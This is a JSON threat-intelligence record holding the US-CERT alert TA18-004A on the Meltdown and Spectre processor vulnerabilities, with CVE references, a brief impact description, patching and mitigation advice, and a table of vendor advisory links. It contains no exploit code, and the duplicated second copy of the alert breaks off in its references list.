{
	"objects": [
		{
			"type": "report",
			"title": "TA18-004A: Meltdown and Spectre Side-Channel Vulnerability Guidance",
			"name": "TA18-004A: Meltdown and Spectre Side-Channel Vulnerability Guidance",
			"id": "report-f41226b1-4914-4294-82c1-31e484459dec",
			"description": "Original release date: January 04, 2018 | Last revised: February 10, 2018<br />\n\t\t<h3>Systems Affected</h3>\n\t\t<p>CPU hardware implementations</p>\t\t\n\t\t<h3>Overview</h3>\n\t\t<p>On January 3, 2018, the National Cybersecurity and Communications Integration Center (NCCIC) became aware of a set of security vulnerabilities—known as <a href=\"https://meltdownattack.com/\">Meltdown</a> and <a href=\"https://spectreattack.com/\">Spectre</a>—that affect modern computer processors. These vulnerabilities can be exploited to steal sensitive data present in a computer systems' memory.</p>\t\t\n\t\t<h3>Description</h3>\n\t\t<p>CPU hardware implementations are vulnerable to side-channel attacks, referred to as Meltdown and Spectre. Meltdown is a bug that \"melts\" the security boundaries normally enforced by the hardware, affecting desktops, laptops, and cloud computers. Spectre is a flaw an attacker can exploit to force a program to reveal its data. The name derives from \"speculative execution\"—an optimization method a computer system performs to check whether it will work to prevent a delay when actually executed. Spectre affects almost all devices including desktops, laptops, cloud servers, and smartphones.</p><p>More details of these attacks can be found here:</p><ul><li>Common Vulnerability and Exposure (CVE):<ul><li>Rogue Data Cache Load: <a href=\"https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5754\">CVE-2017-5754</a> (Meltdown) <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-5754\">https://nvd.nist.gov/vuln/detail/CVE-2017-5754</a></li><li>Bounds Check Bypass: <a href=\"https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5753\">CVE-2017-5753</a> (Spectre) <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-5753\">https://nvd.nist.gov/vuln/detail/CVE-2017-5753</a></li><li>Branch Target Injection: <a href=\"https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5715\">CVE-2017-5715</a> (Spectre) <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-5715\">https://nvd.nist.gov/vuln/detail/CVE-2017-5715</a></li></ul></li><li>CERT/CC’s Vulnerability Note <a href=\"https://www.kb.cert.org/vuls/id/584653\">VU#584653</a></li></ul>\t\t\n\t\t<h3>Impact</h3>\n\t\t<p>An attacker can gain access to the system by establishing command and control presence on a machine via malicious Javascript, malvertising, or phishing. Once successful, the attacker could escalate privileges to exploit Meltdown and Spectre vulnerabilities, revealing sensitive information from a computer’s kernel memory, including keystrokes, passwords, encryption keys, and other valuable information.</p>\t\t\n\t\t<h3>Solution</h3>\n\t\t<p><strong>Mitigation</strong></p><p>NCCIC encourages users and administrators to refer to their hardware and software vendors for the most recent information. In the case of Spectre, the vulnerability exists in CPU architecture rather than in software, and is not easily patched; however, this vulnerability is more difficult to exploit. </p><p>After patching, performance impacts may vary, depending on use cases. NCCIC recommends administrators ensure that performance is monitored for critical applications and services, and work with their vendor(s) and service provider(s) to mitigate the effect, if possible.</p><p>Additionally, NCCIC recommends users and administrators who rely on cloud infrastructure work with their CSP to mitigate and resolve any impacts resulting from host OS patching and mandatory rebooting.</p><p>For machines running Windows Server, a number of registry changes must be completed in addition to installation of the patches.  NCCIC recommends verifying your Windows Server version before downloading applicable patches and performing registry edits.  A list of registry changes can be found here: <a href=\"https://support.microsoft.com/en-us/help/4072698/windows-server-guidance-to-protect-against-the-speculative-execution\">https://support.microsoft.com/en-us/help/4072698/windows-server-guidance-to-protect-against-the-speculative-execution</a></p><p><strong>Antivirus</strong></p><p>Typical antivirus programs are built on a signature management system, and may not be able to detect the vulnerabilities. NCCIC recommends checking with your antivirus vendor to confirm compatibility with Meltdown and Spectre patches. Microsoft recommends third-party antivirus vendors add a change to the registry key of the machine running the antivirus software. Without it, that machine will not receive any of the following fixes from Microsoft:</p><ul><li>Windows Update</li><li>Windows Server Update Services</li><li>System Center Configuration Manager </li></ul><p>More information can be found here: <a href=\"https://support.microsoft.com/en-us/help/4072699/january-3-2018-windows-security-updates-and-antivirus-software\">https://support.microsoft.com/en-us/help/4072699/january-3-2018-windows-security-updates-and-antivirus-software</a>.</p><p><strong>Vendor Links</strong></p><p>The following table contains links to advisories and patches published in response to the vulnerabilities. This table will be updated as information becomes available.</p><p>Note: NCCIC strongly recommends:</p><ul><li>downloading any patches or microcode directly from your vendor's website</li><li>using a test environment to verify each patch before implmenting</li></ul><table border=\"1\" cellpadding=\"1\" cellspacing=\"1\" class=\"general-table\" style=\"width: 400px; height: 312px;\"><thead><tr><th scope=\"col\"><strong>Link to Vendor Information</strong></th><th scope=\"col\"><strong>Date Added</strong></th></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://aws.amazon.com/security/security-bulletins/AWS-2018-013/\">Amazon</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://www.amd.com/en/corporate/speculative-execution\">AMD</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://source.android.com/security/bulletin/2018-01-01\">Android</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://support.apple.com/en-us/HT208394\">Apple</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://developer.arm.com/support/security-update\">ARM</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://lists.centos.org/pipermail/centos-announce/2018-January/date.html\">CentOS</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://www.chromium.org/Home/chromium-security/ssca\">Chromium</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180104-cpusidechannel \">Cisco</a></td><td scope=\"col\" style=\"text-align: left;\">January 10, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://support.citrix.com/article/CTX231390\">Citrix</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://security-tracker.debian.org/tracker/CVE-2017-5754\">Debian</a></td><td scope=\"col\" style=\"text-align: left;\">January 5, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://lists.dragonflybsd.org/pipermail/users/2018-January/313758.html\">DragonflyBSD</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://support.f5.com/csp/article/K91229003\">F5</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://fedoramagazine.org/protect-fedora-system-meltdown\">Fedora Project</a></td><td scope=\"col\" style=\"text-align: left;\">January 5, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://fortiguard.com/psirt/FG-IR-18-002\">Fortinet</a></td><td scope=\"col\" style=\"text-align: left;\">January 5, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://support.hp.com/document/c05869091\">HP</a></td><td scope=\"col\" style=\"text-align: left;\">January 19, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://security.googleblog.com/2018/01/todays-cpu-vulnerability-what-you-need.html\">Google</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://www.huawei.com/en/psirt/security-notices/huawei-sn-20180104-01-intel-en\">Huawei</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://securityintelligence.com/cpu-vulnerability-can-allow-attackers-to-read-privileged-kernel-memory-and-leak-data/\">IBM</a></td><td scope=\"col\" style=\"text-align: left;\">January 5, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00088&amp;languageid=en-fr\">Intel</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://kb.juniper.net/InfoCenter/index?page=content&amp;id=JSA10842&amp;cat=SIRT_1&amp;actp=LIST\">Juniper</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://support.lenovo.com/us/en/solutions/len-18282\">Lenovo</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://lkml.org/lkml/2017/12/4/709\">Linux</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://lists.llvm.org/pipermail/llvm-commits/Week-of-Mon-20180101/513630.html\">LLVM: variant #2</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://reviews.llvm.org/D41760 %3chttps:/reviews.llvm.org/D41760%3e\">LLVM: builtin_load_no_speculate</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://reviews.llvm.org/D41761\">LLVM: llvm.nospeculatedload</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://azure.microsoft.com/en-us/blog/securing-azure-customers-from-cpu-vulnerability/\">Microsoft Azure</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV180002\">Microsoft</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://blog.mozilla.org/security/2018/01/03/mitigations-landing-new-class-timing-attack\">Mozilla</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://security.netapp.com/advisory/ntap-20180104-0001/\">NetApp</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://info.nutanix.com/TA5G00u0C000PVD00O0A8Q0\">Nutanix</a></td><td scope=\"col\" style=\"text-align: left;\">January 10, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://nvidia.custhelp.com/app/answers/detail/a_id/4609\">NVIDIA</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://lists.opensuse.org/opensuse-security-announce/2018-01/msg00001.html\">OpenSuSE</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://www.oracle.com/technetwork/security-advisory/cpujan2018-3236628.html\">Oracle</a></td><td scope=\"col\" style=\"text-align: left;\">January 17, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://www.qubes-os.org/news/2018/01/04/xsa-254-meltdown-spectre/\">Qubes</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://access.redhat.com/security/security-updates/#/security-advisories?q=&amp;p=1&amp;sort=portal_publication_date%20desc&amp;rows=10&amp;documentKind=PortalProduct\">Red Hat</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://lists.suse.com/pipermail/sle-security-updates/2018-January/date.html\">SuSE</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://www.synology.com/en-us/support/security/Synology_SA_18_01\">Synology</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://success.trendmicro.com/solution/1119183-important-information-for-trend-micro-solutions-and-microsoft-january-2018-security-updates\">Trend Micro</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://wiki.ubuntu.com/SecurityTeam/KnowledgeBase/SpectreAndMeltdown\">Ubuntu</a></td><td scope=\"col\" style=\"text-align: left;\">January 17, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://www.vmware.com/security/advisories/VMSA-2018-0007.html\">VMware</a></td><td scope=\"col\" style=\"text-align: left;\">January 10, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://xenbits.xen.org/xsa/advisory-254.html\">Xen</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr></thead></table><p> </p>\t\t\n\t\t<h3>References</h3>\n\t\t<ul>\n\t\t\t\t\t<li><a href=\"https://meltdownattack.com/\">Graz University of Technology Meltdown website</a></li>\n\t\t\t\t\t<li><a href=\"https://spectreattack.com/\">Graz University of Technology Spectre website</a></li>\n\t\t\t\t\t<li><a href=\"https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5754\">Rogue Data Cache Load: CVE-2017-5754</a></li>\n\t\t\t\t\t<li><a href=\"https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5753\">Bounds Check Bypass: CVE-2017-5753</a></li>\n\t\t\t\t\t<li><a href=\"https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5715\">Branch Target Injection: CVE-2017-5715</a></li>\n\t\t\t\t\t<li><a href=\"https://www.kb.cert.org/vuls/id/584653\">CERT/CC’s Vulnerability Note VU#584653</a></li>\n\t\t\t\t</ul>\n\t\t\n\t\t<h3>Revision History</h3>\n\t\t<ul>\n\t\t\t\t\t<li>January 4, 2018: Initial version</li>\n\t\t\t\t\t\t<li>January 5, 2018: Updated vendor information links for Citrix, Mozilla, and IBM in the table and added links to Debian, Fedora Project, and Fortinet</li>\n\t\t\t\t\t\t<li>January 8, 2018: Added links to DragonflyBSD, Juniper, LLVM, NetApp, Qubes, and Synology</li>\n\t\t\t\t\t\t<li>January 9, 2018: Updated Solution Section</li>\n\t\t\t\t\t\t<li>January 10, 2018: Added links to Cisco and Nutanix</li>\n\t\t\t\t\t\t<li>January 17, 2018: Added note to Mitigation section and links to Oracle and Ubuntu</li>\n\t\t\t\t\t\t<li>January 18, 2018: Updated Description, Impact, and Solution Sections, and added an additional link</li>\n\t\t\t\t\t\t<li>January 19, 2018: Added link to HP</li>\n\t\t\t\t\t\t<li>January 31, 2018: Provided additional links and updated Description and Mitigation sections</li>\n\t\t\t\t\t</ul>\n\t\t<hr />\n\t\t<p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t<br />",
			"external_references": [
				{
					"external_id": "10408 at https://www.us-cert.gov",
					"url": "https://www.us-cert.gov/ncas/alerts/TA18-004A",
					"source_name": "open source",
					"description": "Original release date: January 04, 2018 | Last revised: February 10, 2018<br />\n\t\t<h3>Systems Affected</h3>\n\t\t<p>CPU hardware implementations</p>\t\t\n\t\t<h3>Overview</h3>\n\t\t<p>On January 3, 2018, the National Cybersecurity and Communications Integration Center (NCCIC) became aware of a set of security vulnerabilities—known as <a href=\"https://meltdownattack.com/\">Meltdown</a> and <a href=\"https://spectreattack.com/\">Spectre</a>—that affect modern computer processors. These vulnerabilities can be exploited to steal sensitive data present in a computer systems' memory.</p>\t\t\n\t\t<h3>Description</h3>\n\t\t<p>CPU hardware implementations are vulnerable to side-channel attacks, referred to as Meltdown and Spectre. Meltdown is a bug that \"melts\" the security boundaries normally enforced by the hardware, affecting desktops, laptops, and cloud computers. Spectre is a flaw an attacker can exploit to force a program to reveal its data. The name derives from \"speculative execution\"—an optimization method a computer system performs to check whether it will work to prevent a delay when actually executed. Spectre affects almost all devices including desktops, laptops, cloud servers, and smartphones.</p><p>More details of these attacks can be found here:</p><ul><li>Common Vulnerability and Exposure (CVE):<ul><li>Rogue Data Cache Load: <a href=\"https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5754\">CVE-2017-5754</a> (Meltdown) <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-5754\">https://nvd.nist.gov/vuln/detail/CVE-2017-5754</a></li><li>Bounds Check Bypass: <a href=\"https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5753\">CVE-2017-5753</a> (Spectre) <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-5753\">https://nvd.nist.gov/vuln/detail/CVE-2017-5753</a></li><li>Branch Target Injection: <a href=\"https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5715\">CVE-2017-5715</a> (Spectre) <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-5715\">https://nvd.nist.gov/vuln/detail/CVE-2017-5715</a></li></ul></li><li>CERT/CC’s Vulnerability Note <a href=\"https://www.kb.cert.org/vuls/id/584653\">VU#584653</a></li></ul>\t\t\n\t\t<h3>Impact</h3>\n\t\t<p>An attacker can gain access to the system by establishing command and control presence on a machine via malicious Javascript, malvertising, or phishing. Once successful, the attacker could escalate privileges to exploit Meltdown and Spectre vulnerabilities, revealing sensitive information from a computer’s kernel memory, including keystrokes, passwords, encryption keys, and other valuable information.</p>\t\t\n\t\t<h3>Solution</h3>\n\t\t<p><strong>Mitigation</strong></p><p>NCCIC encourages users and administrators to refer to their hardware and software vendors for the most recent information. In the case of Spectre, the vulnerability exists in CPU architecture rather than in software, and is not easily patched; however, this vulnerability is more difficult to exploit. </p><p>After patching, performance impacts may vary, depending on use cases. NCCIC recommends administrators ensure that performance is monitored for critical applications and services, and work with their vendor(s) and service provider(s) to mitigate the effect, if possible.</p><p>Additionally, NCCIC recommends users and administrators who rely on cloud infrastructure work with their CSP to mitigate and resolve any impacts resulting from host OS patching and mandatory rebooting.</p><p>For machines running Windows Server, a number of registry changes must be completed in addition to installation of the patches.  NCCIC recommends verifying your Windows Server version before downloading applicable patches and performing registry edits.  A list of registry changes can be found here: <a href=\"https://support.microsoft.com/en-us/help/4072698/windows-server-guidance-to-protect-against-the-speculative-execution\">https://support.microsoft.com/en-us/help/4072698/windows-server-guidance-to-protect-against-the-speculative-execution</a></p><p><strong>Antivirus</strong></p><p>Typical antivirus programs are built on a signature management system, and may not be able to detect the vulnerabilities. NCCIC recommends checking with your antivirus vendor to confirm compatibility with Meltdown and Spectre patches. Microsoft recommends third-party antivirus vendors add a change to the registry key of the machine running the antivirus software. Without it, that machine will not receive any of the following fixes from Microsoft:</p><ul><li>Windows Update</li><li>Windows Server Update Services</li><li>System Center Configuration Manager </li></ul><p>More information can be found here: <a href=\"https://support.microsoft.com/en-us/help/4072699/january-3-2018-windows-security-updates-and-antivirus-software\">https://support.microsoft.com/en-us/help/4072699/january-3-2018-windows-security-updates-and-antivirus-software</a>.</p><p><strong>Vendor Links</strong></p><p>The following table contains links to advisories and patches published in response to the vulnerabilities. This table will be updated as information becomes available.</p><p>Note: NCCIC strongly recommends:</p><ul><li>downloading any patches or microcode directly from your vendor's website</li><li>using a test environment to verify each patch before implmenting</li></ul><table border=\"1\" cellpadding=\"1\" cellspacing=\"1\" class=\"general-table\" style=\"width: 400px; height: 312px;\"><thead><tr><th scope=\"col\"><strong>Link to Vendor Information</strong></th><th scope=\"col\"><strong>Date Added</strong></th></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://aws.amazon.com/security/security-bulletins/AWS-2018-013/\">Amazon</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://www.amd.com/en/corporate/speculative-execution\">AMD</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://source.android.com/security/bulletin/2018-01-01\">Android</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://support.apple.com/en-us/HT208394\">Apple</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://developer.arm.com/support/security-update\">ARM</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://lists.centos.org/pipermail/centos-announce/2018-January/date.html\">CentOS</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://www.chromium.org/Home/chromium-security/ssca\">Chromium</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180104-cpusidechannel \">Cisco</a></td><td scope=\"col\" style=\"text-align: left;\">January 10, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://support.citrix.com/article/CTX231390\">Citrix</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://security-tracker.debian.org/tracker/CVE-2017-5754\">Debian</a></td><td scope=\"col\" style=\"text-align: left;\">January 5, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://lists.dragonflybsd.org/pipermail/users/2018-January/313758.html\">DragonflyBSD</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://support.f5.com/csp/article/K91229003\">F5</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://fedoramagazine.org/protect-fedora-system-meltdown\">Fedora Project</a></td><td scope=\"col\" style=\"text-align: left;\">January 5, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://fortiguard.com/psirt/FG-IR-18-002\">Fortinet</a></td><td scope=\"col\" style=\"text-align: left;\">January 5, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://support.hp.com/document/c05869091\">HP</a></td><td scope=\"col\" style=\"text-align: left;\">January 19, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://security.googleblog.com/2018/01/todays-cpu-vulnerability-what-you-need.html\">Google</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://www.huawei.com/en/psirt/security-notices/huawei-sn-20180104-01-intel-en\">Huawei</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://securityintelligence.com/cpu-vulnerability-can-allow-attackers-to-read-privileged-kernel-memory-and-leak-data/\">IBM</a></td><td scope=\"col\" style=\"text-align: left;\">January 5, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00088&amp;languageid=en-fr\">Intel</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://kb.juniper.net/InfoCenter/index?page=content&amp;id=JSA10842&amp;cat=SIRT_1&amp;actp=LIST\">Juniper</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://support.lenovo.com/us/en/solutions/len-18282\">Lenovo</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://lkml.org/lkml/2017/12/4/709\">Linux</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://lists.llvm.org/pipermail/llvm-commits/Week-of-Mon-20180101/513630.html\">LLVM: variant #2</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://reviews.llvm.org/D41760 %3chttps:/reviews.llvm.org/D41760%3e\">LLVM: builtin_load_no_speculate</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://reviews.llvm.org/D41761\">LLVM: llvm.nospeculatedload</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://azure.microsoft.com/en-us/blog/securing-azure-customers-from-cpu-vulnerability/\">Microsoft Azure</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV180002\">Microsoft</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://blog.mozilla.org/security/2018/01/03/mitigations-landing-new-class-timing-attack\">Mozilla</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://security.netapp.com/advisory/ntap-20180104-0001/\">NetApp</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://info.nutanix.com/TA5G00u0C000PVD00O0A8Q0\">Nutanix</a></td><td scope=\"col\" style=\"text-align: left;\">January 10, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://nvidia.custhelp.com/app/answers/detail/a_id/4609\">NVIDIA</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://lists.opensuse.org/opensuse-security-announce/2018-01/msg00001.html\">OpenSuSE</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://www.oracle.com/technetwork/security-advisory/cpujan2018-3236628.html\">Oracle</a></td><td scope=\"col\" style=\"text-align: left;\">January 17, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://www.qubes-os.org/news/2018/01/04/xsa-254-meltdown-spectre/\">Qubes</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://access.redhat.com/security/security-updates/#/security-advisories?q=&amp;p=1&amp;sort=portal_publication_date%20desc&amp;rows=10&amp;documentKind=PortalProduct\">Red Hat</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://lists.suse.com/pipermail/sle-security-updates/2018-January/date.html\">SuSE</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://www.synology.com/en-us/support/security/Synology_SA_18_01\">Synology</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://success.trendmicro.com/solution/1119183-important-information-for-trend-micro-solutions-and-microsoft-january-2018-security-updates\">Trend Micro</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://wiki.ubuntu.com/SecurityTeam/KnowledgeBase/SpectreAndMeltdown\">Ubuntu</a></td><td scope=\"col\" style=\"text-align: left;\">January 17, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://www.vmware.com/security/advisories/VMSA-2018-0007.html\">VMware</a></td><td scope=\"col\" style=\"text-align: left;\">January 10, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://xenbits.xen.org/xsa/advisory-254.html\">Xen</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr></thead></table><p> </p>\t\t\n\t\t<h3>References</h3>\n\t\t<ul>\n\t\t\t\t\t<li><a href=\"https://meltdownattack.com/\">Graz University of Technology Meltdown website</a></li>\n\t\t\t\t\t<li><a href=\"https://spectreattack.com/\">Graz University of Technology Spectre website</a></li>\n\t\t\t\t\t<li><a href=\"https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5754\">Rogue Data Cache Load: CVE-2017-5754</a></li>\n\t\t\t\t\t<li><a href=\"https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5753\">Bounds Check Bypass: CVE-2017-5753</a></li>\n\t\t\t\t\t<li><a href=\"https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5715\">Branch Target Injection: CVE-2017-5715</a></li>\n\t\t\t\t\t<li><a href=\"https://www.kb.cert.org/vuls/id/584653\">CERT/CC’s Vulnerability Note 